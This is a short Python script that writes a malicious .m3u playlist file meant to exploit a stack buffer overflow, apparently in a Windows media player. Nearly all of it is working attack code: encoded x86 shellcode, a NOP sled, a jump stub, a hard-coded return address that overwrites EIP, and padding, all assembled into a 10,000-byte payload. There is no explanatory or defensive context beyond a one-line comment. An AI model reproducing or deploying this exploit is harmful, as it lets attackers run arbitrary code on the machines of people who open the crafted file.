#!/bin/python
#just for trying. there are simpler ways
import struct


jmp = 7*"\x90"+2*"\x83\xec\x64"+"\x83\xec\x28"+"\xff\xe4"
shellcode = ("\x6a\x30\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xbe\x2a"
"\xb5\xef\x83\xeb\xfc\xe2\xf4\x42\xc2\x37\xef\xbe\x2a\xd5\x66"
"\x5b\x1b\x75\x8b\x35\x7a\x85\x64\xec\x26\x3e\xbd\xaa\xa1\xc7"
"\xc7\xb1\x9d\xff\xc9\x8f\xd5\x19\xd3\xdf\x56\xb7\xc3\x9e\xeb"
"\x7a\xe2\xbf\xed\x57\x1d\xec\x7d\x3e\xbd\xae\xa1\xff\xd3\x35"
"\x66\xa4\x97\x5d\x62\xb4\x3e\xef\xa1\xec\xcf\xbf\xf9\x3e\xa6"
"\xa6\xc9\x8f\xa6\x35\x1e\x3e\xee\x68\x1b\x4a\x43\x7f\xe5\xb8"
"\xee\x79\x12\x55\x9a\x48\x29\xc8\x17\x85\x57\x91\x9a\x5a\x72"
"\x3e\xb7\x9a\x2b\x66\x89\x35\x26\xfe\x64\xe6\x36\xb4\x3c\x35"
"\x2e\x3e\xee\x6e\xa3\xf1\xcb\x9a\x71\xee\x8e\xe7\x70\xe4\x10"
"\x5e\x75\xea\xb5\x35\x38\x5e\x62\xe3\x40\xb4\x62\x3b\x98\xb5"
"\xef\xbe\x7a\xdd\xde\x35\x45\x32\x10\x6b\x91\x45\x5a\x1c\x7c"
"\xdd\x49\x2b\x97\x28\x10\x6b\x16\xb3\x93\xb4\xaa\x4e\x0f\xcb"
"\x2f\x0e\xa8\xad\x58\xda\x85\xbe\x79\x4a\x3a\xdd\x4b\xd9\x8c"
"\xbe\x2a\xb5\xef")
nop = (260-len(shellcode+jmp))*"\x90"
print len(nop+shellcode+jmp)
eip = struct.pack('<L', 0x7e487477)
fill = (10000-len(jmp+nop+shellcode+eip))*"\x90"
payload = jmp+nop+shellcode+eip+fill

with open('exploit.m3u', 'w') as exploit:
    exploit.write(payload)